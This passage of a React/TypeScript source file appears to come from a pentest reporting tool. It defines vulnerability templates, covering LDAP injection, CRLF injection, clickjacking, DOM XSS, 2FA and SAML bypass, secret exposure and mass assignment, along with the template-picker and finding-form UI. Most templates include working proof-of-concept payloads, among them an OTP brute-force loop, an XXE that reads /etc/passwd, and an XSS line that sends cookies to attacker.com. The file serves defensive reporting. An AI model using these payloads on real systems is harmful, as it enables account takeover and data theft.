    attack_scenario: "Login form constructs an LDAP filter: `(&(uid=USER)(password=PASS))`. Attacker submits `*)(uid=*))(|(uid=*` as username with any password. The filter becomes always-true, granting access without valid credentials.",
    proof_of_concept: `# 1. Authentication bypass
Username: *)(uid=*))(|(uid=*
Password: anything

# 2. Wildcard enumeration - list all users
Username: *
Password: *

# 3. Boolean-based attribute extraction
Username: admin)(&(password=a*
# Iterate through characters to extract password hashes

# 4. Test with special LDAP chars: * ( ) \ NUL`,
    detection_guidance: "Test all LDAP-backed authentication with LDAP metacharacters. Use tools like ldap-injection-scanner. Review all LDAP filter construction for string concatenation with user input.",
    affected_technologies: "Active Directory integrations, OpenLDAP, Oracle Directory Server; Java (JNDI), Python python-ldap, PHP ldap_search; SSO systems using LDAP backends",
    description: `User-supplied input is incorporated into LDAP queries without sanitization, allowing an attacker to modify the LDAP filter logic.

LDAP injection can result in:
- Bypassing authentication by making the filter always evaluate to true
- Enumerating directory entries, user accounts, and attributes
- Extracting sensitive LDAP attributes via boolean-based techniques`,
    remediation: `1. Escape all user-supplied input using LDAP escape functions (ldap_escape in PHP, RFC 4515 escaping)
2. Use parameterized LDAP query APIs where available
3. Apply an allowlist of permitted characters for directory attribute queries
4. Limit LDAP service account permissions to only required attributes
5. Disable anonymous LDAP binding`,
    references_text: `https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/90.html`,
  },
  {
    id: "crlf-injection",
    title: "CRLF Injection / HTTP Response Splitting",
    severity: "medium",
    category: "Injection",
    cvss_score: "6.1",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-93",
    mitre: "T1059",
    difficulty: "Medium",
    business_impact: "Cross-site scripting via injected response headers, session cookie injection, cache poisoning, and page defacement.",
    attack_scenario: "A redirect endpoint includes the user-supplied `next` parameter in a Location header. Attacker injects `%0d%0aSet-Cookie:%20session=attacker_value%0d%0a` into the parameter, causing the response to set an attacker-controlled session cookie in the victim's browser.",
    proof_of_concept: `# 1. Inject newlines into Location header
GET /redirect?next=/home%0d%0aSet-Cookie:%20session=hijacked

# 2. Inject custom header with XSS
GET /redirect?next=/home%0d%0aX-Custom:%20<script>alert(1)</script>

# 3. HTTP response splitting (old proxies)
GET /page?lang=en%0d%0aHTTP/1.1%20200%20OK%0d%0a...injected body...

# URL-encoded variants: %0d%0a, %0a, %0d, \\r\\n, \\n`,
    detection_guidance: "Test all redirect and header-reflection parameters with URL-encoded CRLF sequences. Verify the application strips or rejects `\\r`, `\\n` in header values.",
    affected_technologies: "PHP header(), Python Flask/Django redirect helpers, Java HttpServletResponse.setHeader; any framework that includes user input in HTTP response headers",
    description: `The application includes user-supplied data in HTTP response headers without stripping carriage return (CR, \\r) and line feed (LF, \\n) characters.

This allows an attacker to inject arbitrary HTTP headers or split the response into two separate responses, enabling XSS, session fixation, and cache poisoning.`,
    remediation: `1. Strip or reject \\r and \\n characters from any user input used in HTTP headers
2. Use framework-provided redirect methods that encode header values
3. Validate redirect targets against an allowlist
4. Keep web framework and server libraries updated
5. Apply WAF rules to detect encoded CRLF in query parameters`,
    references_text: `https://owasp.org/www-community/attacks/HTTP_Response_Splitting
https://cwe.mitre.org/data/definitions/93.html`,
  },
  {
    id: "clickjacking",
    title: "Clickjacking",
    severity: "medium",
    category: "UI Redressing",
    cvss_score: "6.5",
    cve_text: "",
    owasp: "A05:2021",
    cwe: "CWE-1021",
    mitre: "T1185",
    difficulty: "Easy",
    business_impact: "Unauthorized state-changing actions performed by tricked users: account deletion, settings changes, unintended purchases, and social media actions.",
    attack_scenario: "Application lacks X-Frame-Options or CSP frame-ancestors. Attacker embeds the account deletion page in a transparent iframe over a fake 'Spin to Win' game. Users click what they think is the 'Play' button but are actually clicking 'Delete Account'.",
    proof_of_concept: `# 1. Check if site can be framed
curl -I https://target.com | grep -i "x-frame-options\|frame-ancestors"

# 2. PoC iframe overlay
<html><body>
<style>
  iframe { opacity:0.01; position:absolute; top:0; left:0; width:100%; height:100%; z-index:2; }
  button { position:absolute; top:200px; left:100px; z-index:1; }
</style>
<iframe src="https://target.com/account/delete"></iframe>
<button>Click here for a free prize!</button>
</body></html>

# 3. Test with browser developer tools - try to frame the target page`,
    detection_guidance: "Check all pages for X-Frame-Options (DENY/SAMEORIGIN) or CSP frame-ancestors directive. Test by embedding in an iframe. Particularly test admin and state-changing pages.",
    affected_technologies: "All web applications lacking X-Frame-Options or CSP frame-ancestors; legacy applications; admin panels and sensitive action pages",
    description: `The application can be embedded in an iframe on an attacker-controlled page due to missing X-Frame-Options or Content-Security-Policy frame-ancestors directives.

Attackers overlay the framed application with a deceptive UI layer to trick users into performing unintended actions, believing they are interacting with the attacker's page.`,
    remediation: `1. Set X-Frame-Options: DENY or SAMEORIGIN in all HTTP responses
2. Implement CSP with frame-ancestors 'none' or frame-ancestors 'self'
3. Add frame-busting JavaScript as a defense-in-depth measure
4. Require re-authentication for critical state-changing operations
5. CSP frame-ancestors is preferred over X-Frame-Options as it supports granular origin specification`,
    references_text: `https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/1021.html`,
  },
  {
    id: "dom-xss",
    title: "DOM-Based Cross-Site Scripting (XSS)",
    severity: "high",
    category: "XSS",
    cvss_score: "7.5",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-79",
    mitre: "T1059.007",
    difficulty: "Medium",
    business_impact: "Session hijacking, credential theft, and malware distribution — entirely client-side, bypassing server-side WAF and input validation.",
    attack_scenario: "SPA reads `location.hash` and passes it to `innerHTML` for tab selection. Attacker crafts `https://target.com/#<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>`. When victim opens the URL, the XSS executes without any server request being made.",
    proof_of_concept: `# 1. Hash-based sink
https://target.com/#<img src=x onerror=alert(document.domain)>

# 2. URL parameter in document.write
https://target.com/?name=<script>alert(1)</script>

# 3. postMessage handler abuse
window.postMessage('<img src=x onerror=alert(1)>', '*')

# 4. DOM sources to test: location.hash, location.search, document.referrer
# Sinks to test: innerHTML, eval, document.write, setTimeout(string)`,
    detection_guidance: "Use DOM Invader (Burp extension) to automatically track data flows from sources to sinks. Manual code review of JavaScript for dangerous sink usage with user-controlled sources.",
    affected_technologies: "JavaScript SPAs (React, Vue, Angular when bypassing framework safety); jQuery .html(), legacy JavaScript with innerHTML; browser extensions",
    description: `The application's client-side JavaScript reads data from an attacker-controllable source (URL hash, query parameter, postMessage, document.referrer) and passes it to a dangerous sink (innerHTML, eval, document.write) without sanitization.

Unlike reflected/stored XSS, DOM XSS is entirely client-side — the payload never reaches the server, bypassing server-side protections.`,
    remediation: `1. Use textContent instead of innerHTML when inserting user data
2. Use DOM APIs (createElement, createTextNode) instead of HTML string construction
3. Sanitize all DOM input with DOMPurify before inserting as HTML
4. Implement a strict Content Security Policy that prohibits inline scripts
5. Avoid passing user-controlled strings to eval, setTimeout, setInterval, Function()
6. Use framework data-binding (React JSX, Vue template) which auto-escapes by default`,
    references_text: `https://portswigger.net/web-security/cross-site-scripting/dom-based
https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/79.html`,
  },
  {
    id: "business-logic",
    title: "Business Logic Vulnerability",
    severity: "high",
    category: "Business Logic",
    cvss_score: "7.5",
    cve_text: "",
    owasp: "A04:2021",
    cwe: "CWE-840",
    mitre: "T1499",
    difficulty: "Hard",
    business_impact: "Financial loss through price manipulation, privilege escalation by abusing workflow gaps, mass data access via logical access control bypass.",
    attack_scenario: "Checkout allows negative quantity items. Attacker adds -1 of a $100 item and 2 of a $10 item. Total becomes -$80, which the system applies as a credit. Combined with a gift card, attacker profits from the purchase.",
    proof_of_concept: `# 1. Negative quantity/price manipulation
POST /cart/add
{"item_id": "premium", "quantity": -1}

# 2. Workflow step skipping
# Normal: step1 → step2 → step3 → complete
# Attack: POST /step3/complete directly (skipping verification steps)

# 3. Currency/unit confusion
# Submit price in different currency than expected
# Submit integer where float expected (drop decimal precision)

# 4. Privilege escalation via role parameter
POST /register
{"email": "x@x.com", "role": "admin"}`,
    detection_guidance: "Manual testing of all multi-step workflows. Test boundary conditions: negative values, zero, max integer. Test parameter tampering in multi-step processes. Review all price/quantity calculation logic.",
    affected_technologies: "E-commerce platforms, subscription billing systems, multi-step form workflows, any application with complex state machines",
    description: `The application contains a flaw in its business logic that allows an attacker to perform unintended operations by abusing expected functionality in unexpected ways.

Common patterns:
- Price, quantity, or discount manipulation
- Skipping required workflow steps
- Exploiting currency/unit conversion edge cases
- Abusing multi-step process state
- Privilege escalation via parameter tampering in registration/upgrade flows`,
    remediation: `1. Define and enforce valid state transitions on the server — never trust client-side workflow state
2. Validate all numeric inputs for logical bounds (no negative quantities, no zero prices)
3. Re-validate authorization and eligibility at each workflow step
4. Log and alert on unusual patterns (negative values, extreme discounts, rapid workflow completion)
5. Conduct threat modeling of business workflows to identify logical abuse scenarios`,
    references_text: `https://portswigger.net/web-security/logic-flaws
https://cwe.mitre.org/data/definitions/840.html`,
  },
  {
    id: "2fa-bypass",
    title: "2FA / MFA Bypass",
    severity: "high",
    category: "Broken Authentication",
    cvss_score: "8.1",
    cve_text: "",
    owasp: "A07:2021",
    cwe: "CWE-287",
    mitre: "T1111",
    difficulty: "Medium",
    business_impact: "Complete bypass of multi-factor authentication leading to full account takeover even when users have MFA enabled.",
    attack_scenario: "After entering username/password, the app redirects to `/dashboard` but also sets a partial-auth cookie. The 2FA page is at `/verify-otp`. Attacker logs in, then directly navigates to `/dashboard` — the app only checks if the session exists, not if OTP was completed. Access granted.",
    proof_of_concept: `# 1. Direct endpoint access after password auth
# Log in with valid credentials → observe session cookie is set
# Skip /verify-otp step → navigate directly to /dashboard

# 2. OTP reuse
# Request OTP → use it → use it again (if not invalidated)

# 3. OTP brute force (if no rate limiting)
for code in $(seq -w 000000 999999); do
  curl -s -X POST https://target.com/verify -d "otp=$code" -H "Cookie: session=..."
done

# 4. Response manipulation
# Intercept 2FA verification response, change {"verified": false} to {"verified": true}

# 5. Backup code enumeration
# If backup codes are sequential or low-entropy`,
    detection_guidance: "Test by skipping the MFA verification step after password auth. Check if OTP codes can be reused. Test rate limiting on OTP endpoint. Verify server-side session state tracking for MFA completion.",
    affected_technologies: "Custom 2FA implementations, TOTP integrations (Google Authenticator), SMS OTP systems; any web app with optional or required MFA",
    description: `The application's multi-factor authentication implementation contains weaknesses that allow bypassing the second factor.

Common bypass techniques:
- Direct navigation to post-login pages without completing MFA
- Response manipulation to change verification result
- OTP brute force due to missing rate limiting
- OTP reuse after successful verification
- Backup code enumeration or leakage`,
    remediation: `1. Enforce MFA completion at the server by tracking authentication state in the session
2. Require MFA state flag in the session for all post-login API calls
3. Implement strict rate limiting on OTP verification (max 5 attempts, then lockout)
4. Invalidate OTP immediately after first successful use
5. Generate backup codes with at least 128 bits of entropy
6. Log and alert on MFA bypass attempts`,
    references_text: `https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html
https://portswigger.net/web-security/authentication/multi-factor`,
  },
  {
    id: "saml-bypass",
    title: "SAML Authentication Bypass",
    severity: "critical",
    category: "Broken Authentication",
    cvss_score: "9.1",
    cve_text: "",
    owasp: "A02:2021",
    cwe: "CWE-347",
    mitre: "T1548",
    difficulty: "Hard",
    business_impact: "Authentication bypass and identity impersonation, enabling access to any user's account including administrators without valid credentials.",
    attack_scenario: "Service provider validates only the signed NameID field. Attacker modifies the unsigned `Role` attribute in the SAML assertion to `admin`. Since the signature only covers NameID, the SP accepts the modified assertion and grants admin access.",
    proof_of_concept: `# 1. XML Signature Wrapping (XSW)
# Move the signed element to a different location in the XML tree
# Insert unsigned malicious element where the SP expects the signed one

# 2. Comment injection
# <NameID>admin<!----@evil.com</NameID>
# Some parsers strip comments → reads as admin

# 3. XXE in SAML assertion
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion>...<saml:NameID>&xxe;</saml:NameID>...

# 4. Tools: SAMLReQuest, SAML Raider (Burp extension)`,
    detection_guidance: "Test with SAML Raider Burp extension. Verify the entire assertion is signed, not just specific elements. Test comment injection and XML wrapping attacks. Check for XXE in SAML processing.",
    affected_technologies: "SAML 2.0 Service Providers; OneLogin, Okta, ADFS integrations; python-saml <2.4.0, ruby-saml <1.13.0, java-opensaml",
    description: `The SAML assertion processing contains vulnerabilities allowing authentication bypass without valid identity provider credentials.

Common attack vectors:
- XML Signature Wrapping (XSW) — moves signed elements, injects unsigned ones
- Signature exclusion — SP accepts unsigned assertions
- Comment injection to alter parsed NameID value
- XXE via malicious XML in SAML assertion
- Attribute manipulation of unsigned fields`,
    remediation: `1. Validate the signature covers the entire assertion, not just specific elements
2. Use a well-maintained SAML library and keep it updated (known CVEs exist)
3. Validate the InResponseTo field to prevent replay attacks
4. Check assertion NotBefore and NotOnOrAfter timestamps
5. Disable XXE in the XML parser used for SAML processing
6. Verify the assertion Issuer matches the expected IdP`,
    references_text: `https://research.aurainfosec.io/bypassing-saml20-SSO/
https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/347.html`,
  },
  {
    id: "api-key-exposure",
    title: "API Key / Secret Exposure",
    severity: "high",
    category: "Sensitive Data",
    cvss_score: "8.2",
    cve_text: "",
    owasp: "A02:2021",
    cwe: "CWE-312",
    mitre: "T1552.001",
    difficulty: "Easy",
    business_impact: "Unauthorized access to third-party services (AWS, Stripe, Twilio, GitHub), data breaches, financial charges, and supply chain compromise.",
    attack_scenario: "Developer commits AWS_ACCESS_KEY_ID to a public GitHub repo. An automated secret scanning bot discovers it within minutes. Attacker uses the key to access S3 buckets with customer PII, spin up crypto-mining EC2 instances, and extract RDS database snapshots.",
    proof_of_concept: `# 1. Scan git history
trufflehog git https://github.com/target/repo --only-verified
gitleaks detect --source . --verbose

# 2. Search JS bundles
wget https://target.com && grep -rE "sk_live_|AKIA|AIza|ghp_|npm_" .

# 3. GitHub dorking
site:github.com "target.com" "api_key"
site:github.com "target.com" "password"

# 4. .env file exposure
curl https://target.com/.env
curl https://target.com/api/.env

# 5. Validate exposed keys
aws sts get-caller-identity --access-key-id FOUND_KEY --secret-access-key FOUND_SECRET`,
    detection_guidance: "Integrate trufflehog or gitleaks in CI/CD pre-commit hooks and PR checks. Monitor for .env file access in web server logs. Set up GitHub secret scanning and push protection.",
    affected_technologies: "Any application with third-party API integrations; AWS/GCP/Azure credentials; GitHub/GitLab tokens; Stripe/Twilio/SendGrid keys; frontend JavaScript bundles",
    description: `API keys, secrets, tokens, or passwords are exposed in publicly accessible locations: source code repositories, JavaScript bundles, environment files, or API responses.

Common exposure locations:
- Public git repositories (current files or git history)
- Client-side JavaScript bundles
- Misconfigured .env, .git/config, backup files on web servers
- Error messages or debug responses
- Mobile app binaries (strings extraction)`,
    remediation: `1. Immediately rotate all exposed credentials upon discovery
2. Use secrets management (AWS Secrets Manager, HashiCorp Vault, GitHub Secrets)
3. Never commit secrets to version control — use .gitignore and pre-commit hooks
4. Scan git history and remove secrets using git-filter-repo or BFG Repo Cleaner
5. Restrict API key permissions to minimum required scope
6. Enable alerts for unusual API key usage patterns`,
    references_text: `https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/312.html`,
  },
  {
    id: "mass-assignment",
    title: "Mass Assignment",
    severity: "high",
    category: "Broken Access Control",
    cvss_score: "8.1",
    cve_text: "",
    owasp: "A01:2021",
    cwe: "CWE-915",
    mitre: "T1078",
    difficulty: "Easy",
    business_impact: "Privilege escalation (self-promotion to admin), data integrity violations, and bypassing business rules by setting internal-only fields.",
    attack_scenario: "User update endpoint automatically maps all JSON fields to the user model. Attacker submits `{\"email\": \"new@me.com\", \"role\": \"admin\", \"subscription\": \"enterprise\"}`. The ORM applies all fields including the protected ones, granting admin access.",
    proof_of_concept: `# 1. Basic mass assignment
PATCH /api/users/me
{"name": "Alice", "role": "admin", "is_verified": true}

# 2. Discover hidden fields via API response
GET /api/users/me  → {"id": 1, "name": "Alice", "role": "user", "credits": 0}
# Try setting all observed fields including restricted ones

# 3. GraphQL field injection
mutation { updateUser(input: {name: "x", role: ADMIN}) { role } }

# 4. Nested object pollution
{"address": {"city": "NY", "__isAdmin": true}}`,
    detection_guidance: "Review all model binding / deserialization code for allowlists. Test all update endpoints with additional sensitive fields observed in responses. Check GraphQL input types for over-permissive fields.",
    affected_technologies: "Ruby on Rails (before strong parameters), Spring Boot (@RequestBody without @JsonIgnore), Laravel (without $fillable), Mongoose, any framework with automatic request-to-model binding",
    description: `The application automatically binds user-supplied parameters to internal model attributes without filtering, allowing attackers to set sensitive fields that should not be user-modifiable.

This vulnerability is particularly common in frameworks that auto-map request bodies to model objects (Rails, Spring, Laravel, Mongoose).`,
    remediation: `1. Explicitly allowlist permitted fields in model binding (Rails strong_parameters, @JsonProperty(access=READ_ONLY))
2. Use separate DTOs for input and output — never expose internal model fields
3. Never accept role, is_admin, subscription, credits, or similar fields from user input
4. Apply schema validation that rejects unknown or forbidden fields
5. Use PATCH semantics with granular, purpose-specific endpoints instead of generic update endpoints`,
    references_text: `https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/915.html`,
  },
];

const TEMPLATE_CATEGORIES = ["All", ...Array.from(new Set(VULN_TEMPLATES.map((t) => t.category)))];

const SEV_BG: Record<string, string> = {
  critical: "bg-red-500/20 text-red-400 border-red-500/30",
  high: "bg-orange-500/20 text-orange-400 border-orange-500/30",
  medium: "bg-yellow-500/20 text-yellow-400 border-yellow-500/30",
  low: "bg-blue-500/20 text-blue-400 border-blue-500/30",
  info: "bg-zinc-500/20 text-zinc-400 border-zinc-500/30",
};

function TemplatePicker({
  onSelect,
  onClose,
}: {
  onSelect: (t: VulnTemplate) => void;
  onClose: () => void;
}) {
  const [search, setSearch] = useState("");
  const [category, setCategory] = useState("All");
  const [expanded, setExpanded] = useState<string | null>(null);

  const filtered = useMemo(() => {
    return VULN_TEMPLATES.filter((t) => {
      const matchCat = category === "All" || t.category === category;
      const q = search.toLowerCase();
      const matchSearch =
        !q ||
        t.title.toLowerCase().includes(q) ||
        t.category.toLowerCase().includes(q) ||
        t.severity.toLowerCase().includes(q) ||
        t.owasp.toLowerCase().includes(q) ||
        t.cwe.toLowerCase().includes(q);
      return matchCat && matchSearch;
    });
  }, [search, category]);

  return (
    <div className="fixed inset-0 flex items-center justify-center p-4" style={{ zIndex: 60 }}>
      {/* Backdrop */}
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" onClick={onClose} />

      {/* Modal */}
      <div className="relative w-full max-w-3xl max-h-[85vh] flex flex-col bg-zinc-950 border border-zinc-800 rounded-xl shadow-2xl overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b border-zinc-800 shrink-0">
          <div className="flex items-center gap-2">
            <FileText className="h-4 w-4 text-orange-400" />
            <h3 className="text-sm font-semibold text-zinc-100">Vulnerability Template Library</h3>
            <span className="text-xs text-zinc-500 ml-1">{filtered.length} of {VULN_TEMPLATES.length}</span>
          </div>
          <button onClick={onClose} className="text-zinc-500 hover:text-zinc-300">
            <X className="h-4 w-4" />
          </button>
        </div>

        {/* Search + Category filter */}
        <div className="px-5 py-3 border-b border-zinc-800 shrink-0 space-y-3">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-zinc-500" />
            <input
              autoFocus
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search by name, category, OWASP, CWE..."
              className="w-full pl-9 pr-3 py-2 text-sm bg-zinc-900 border border-zinc-700 rounded-lg text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500"
            />
          </div>
          <div className="flex flex-wrap gap-1.5">
            {TEMPLATE_CATEGORIES.map((cat) => (
              <button
                key={cat}
                onClick={() => setCategory(cat)}
                className={`px-2.5 py-1 rounded-md text-xs transition-colors ${
                  category === cat
                    ? "bg-orange-600 text-white"
                    : "bg-zinc-800 text-zinc-400 hover:bg-zinc-700"
                }`}
              >
                {cat}
              </button>
            ))}
          </div>
        </div>

        {/* Template list */}
        <div className="flex-1 overflow-y-auto p-3 space-y-2">
          {filtered.length === 0 && (
            <div className="text-center py-10 text-zinc-500 text-sm">No templates match your search</div>
          )}
          {filtered.map((t) => {
            const isOpen = expanded === t.id;
            return (
              <div key={t.id} className="rounded-lg border border-zinc-800 overflow-hidden">
                {/* Card header row */}
                <div className="flex items-center gap-3 px-4 py-3 hover:bg-zinc-900/50 transition-colors">
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-sm font-medium text-zinc-200">{t.title}</span>
                      <span className={`px-1.5 py-0.5 rounded text-[10px] font-semibold border ${SEV_BG[t.severity] ?? ""}`}>{t.severity}</span>
                      <span className={`px-1.5 py-0.5 rounded text-[10px] font-medium border ${DIFF_COLOR[t.difficulty]}`}>{t.difficulty}</span>
                    </div>
                    <div className="flex items-center gap-2 mt-1 flex-wrap">
                      <span className="text-xs text-zinc-500">{t.category}</span>
                      {t.cvss_score && <span className="text-xs text-zinc-600 font-mono">CVSS {t.cvss_score}</span>}
                      {t.owasp && <span className="text-[10px] text-blue-400 bg-blue-400/10 border border-blue-400/20 px-1.5 py-0.5 rounded font-mono">{t.owasp}</span>}
                      {t.cwe && <span className="text-[10px] text-purple-400 bg-purple-400/10 border border-purple-400/20 px-1.5 py-0.5 rounded font-mono">{t.cwe}</span>}
                      {t.mitre && <span className="text-[10px] text-orange-400 bg-orange-400/10 border border-orange-400/20 px-1.5 py-0.5 rounded font-mono">{t.mitre}</span>}
                    </div>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    <button
                      onClick={() => setExpanded(isOpen ? null : t.id)}
                      className="p-1.5 rounded text-zinc-500 hover:text-zinc-300 hover:bg-zinc-800 transition-colors"
                      title={isOpen ? "Collapse" : "View details"}
                    >
                      {isOpen ? <ChevronUp className="h-3.5 w-3.5" /> : <ChevronDown className="h-3.5 w-3.5" />}
                    </button>
                    <button
                      onClick={() => { onSelect(t); onClose(); }}
                      className="px-3 py-1.5 rounded-md bg-orange-600 hover:bg-orange-500 text-white text-xs font-medium transition-colors"
                    >
                      Apply
                    </button>
                  </div>
                </div>

                {/* Expanded detail panel */}
                {isOpen && (
                  <div className="border-t border-zinc-800 bg-zinc-900/30 px-4 py-4 space-y-4 text-xs">
                    {/* Business Impact */}
                    <div>
                      <div className="flex items-center gap-1.5 text-red-400 font-semibold mb-1">
                        <Shield className="h-3 w-3" /> Business Impact
                      </div>
                      <p className="text-zinc-400 leading-relaxed">{t.business_impact}</p>
                    </div>

                    {/* Attack Scenario */}
                    <div>
                      <div className="flex items-center gap-1.5 text-orange-400 font-semibold mb-1">
                        <Target className="h-3 w-3" /> Attack Scenario
                      </div>
                      <p className="text-zinc-400 leading-relaxed">{t.attack_scenario}</p>
                    </div>

                    {/* Proof of Concept */}
                    <div>
                      <div className="flex items-center gap-1.5 text-yellow-400 font-semibold mb-1">
                        <Zap className="h-3 w-3" /> Proof of Concept
                      </div>
                      <pre className="text-zinc-400 font-mono bg-zinc-950 rounded-md p-3 overflow-x-auto whitespace-pre-wrap text-[11px] leading-relaxed">{t.proof_of_concept}</pre>
                    </div>

                    {/* Detection + Technologies row */}
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <div className="flex items-center gap-1.5 text-emerald-400 font-semibold mb-1">
                          <Eye className="h-3 w-3" /> Detection
                        </div>
                        <p className="text-zinc-400 leading-relaxed">{t.detection_guidance}</p>
                      </div>
                      <div>
                        <div className="flex items-center gap-1.5 text-blue-400 font-semibold mb-1">
                          <ExternalLink className="h-3 w-3" /> Affected Technologies
                        </div>
                        <p className="text-zinc-400 leading-relaxed">{t.affected_technologies}</p>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            );
          })}
        </div>

        {/* Footer hint */}
        <div className="shrink-0 px-5 py-3 border-t border-zinc-800 flex items-center justify-between">
          <span className="text-xs text-zinc-600">Click <ChevronDown className="inline h-3 w-3" /> to preview details before applying</span>
          <button onClick={onClose} className="text-xs text-zinc-500 hover:text-zinc-300">Close</button>
        </div>
      </div>
    </div>
  );
}

function CreateFindingDrawer({
  open,
  onClose,
}: {
  open: boolean;
  onClose: () => void;
}) {
  const [form, setForm] = useState<CreateFindingForm>(EMPTY_FORM);
  const [showPicker, setShowPicker] = useState(false);
  const createFinding = useCreateFinding();

  const set = (field: keyof CreateFindingForm) => (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>
  ) => setForm((f) => ({ ...f, [field]: e.target.value }));

  const applyTemplate = (t: VulnTemplate) => {
    const enrichedDescription = [
      t.description,
      "",
      `── Classification ───────────────────────`,
      t.owasp ? `OWASP: ${t.owasp}` : "",
      t.cwe ? `CWE:   ${t.cwe}` : "",
      t.mitre ? `MITRE: ${t.mitre}` : "",
      t.affected_technologies ? `\nAffected Technologies:\n${t.affected_technologies}` : "",
      "",
      `── Business Impact ──────────────────────`,
      t.business_impact,
      "",
      `── Attack Scenario ──────────────────────`,
      t.attack_scenario,
    ]
      .filter((line) => line !== undefined)
      .join("\n")
      .trim();

    setForm((f) => ({
      ...f,
      title: t.title,
      severity: t.severity,
      category: t.category,
      description: enrichedDescription,
      remediation: t.remediation,
      references_text: t.references_text,
      cvss_score: t.cvss_score,
      cve_text: t.cve_text,
      // evidence left blank — tester fills this in with PoC
    }));
    toast.success(`Template applied: ${t.title}`);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!form.title.trim()) {
      toast.error("Title is required");
      return;
    }

    const cvssNum = form.cvss_score ? parseFloat(form.cvss_score) : undefined;
    if (cvssNum !== undefined && (isNaN(cvssNum) || cvssNum < 0 || cvssNum > 10)) {
      toast.error("CVSS score must be between 0 and 10");
      return;
    }

    const payload = {
      title: form.title.trim(),
      severity: form.severity,
      category: form.category.trim(),
      affected_asset: form.affected_asset.trim(),
      description: form.description.trim(),
      evidence: form.evidence_text.trim() ? { content: form.evidence_text.trim() } : undefined,
      remediation: form.remediation.trim(),
      cve: form.cve_text
        .split(/[\n,]+/)
        .map((s) => s.trim())
        .filter(Boolean),
      cvss_score: cvssNum,
      references: form.references_text
        .split("\n")
        .map((s) => s.trim())
        .filter(Boolean),
      status: form.status,
      ticket_ref: form.ticket_ref.trim() || undefined,
    };

    createFinding.mutate(payload, {
      onSuccess: () => {
        setForm(EMPTY_FORM);
        onClose();
      },
    });
  };

  if (!open) return null;

  return (
    <>
      {/* Backdrop */}
      <div
        className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm"
        onClick={onClose}
      />

      {/* Template picker (renders above drawer) */}
      {showPicker && (
        <TemplatePicker
          onSelect={applyTemplate}
          onClose={() => setShowPicker(false)}
        />
      )}

      {/* Drawer */}
      <div className="fixed inset-y-0 right-0 z-50 w-full max-w-xl flex flex-col bg-zinc-950 border-l border-zinc-800 shadow-2xl overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-zinc-800 shrink-0">
          <div className="flex items-center gap-2">
            <AlertTriangle className="h-4 w-4 text-orange-400" />
            <h2 className="text-base font-semibold text-zinc-100">Create Manual Finding</h2>
          </div>
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={() => setShowPicker(true)}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-zinc-700 bg-zinc-900 hover:bg-zinc-800 text-xs text-zinc-300 transition-colors"
            >
              <FileText className="h-3.5 w-3.5 text-orange-400" />
              Use Template
              <ChevronDown className="h-3 w-3 text-zinc-500" />
            </button>
            <button
              onClick={onClose}
              className="text-zinc-500 hover:text-zinc-300 transition-colors"
            >
              <X className="h-4 w-4" />
            </button>
          </div>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="flex-1 overflow-y-auto px-6 py-5 space-y-5">
          {/* Title */}
          <div className="space-y-1.5">
            <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">
              Title <span className="text-red-400">*</span>
            </label>
            <input
              value={form.title}
              onChange={set("title")}
              placeholder="e.g. SQL Injection in /api/users endpoint"
              className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500"
              required
            />
          </div>

          {/* Severity + Status row */}
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">
                Severity <span className="text-red-400">*</span>
              </label>
              <select
                value={form.severity}
                onChange={set("severity")}
                className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 focus:outline-none focus:border-zinc-500"
              >
                {SEVERITIES.map((s) => (
                  <option key={s} value={s} className={SEV_COLORS[s]}>
                    {s.charAt(0).toUpperCase() + s.slice(1)}
                  </option>
                ))}
              </select>
            </div>
            <div className="space-y-1.5">
              <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">Status</label>
              <select
                value={form.status}
                onChange={set("status")}
                className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 focus:outline-none focus:border-zinc-500"
              >
                {STATUSES.map((s) => (
                  <option key={s} value={s}>
                    {s.replace(/_/g, " ").replace(/\b\w/g, (c) => c.toUpperCase())}
                  </option>
                ))}
              </select>
            </div>
          </div>

          {/* Category + Affected Asset */}
